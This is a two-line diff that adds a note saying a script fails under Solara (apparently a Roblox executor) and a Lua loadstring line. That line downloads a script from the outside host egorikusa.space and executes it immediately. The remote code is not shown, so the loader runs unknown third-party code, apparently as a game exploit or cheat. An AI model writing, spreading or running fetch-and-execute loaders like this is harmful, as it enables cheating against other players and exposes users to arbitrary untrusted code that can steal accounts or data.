@@ -1,0 +1,2 @@
+Script does not work with Solara
+loadstring(game:HttpGet("https://egorikusa.space/873df78a901474abebb71774.lua", true))()
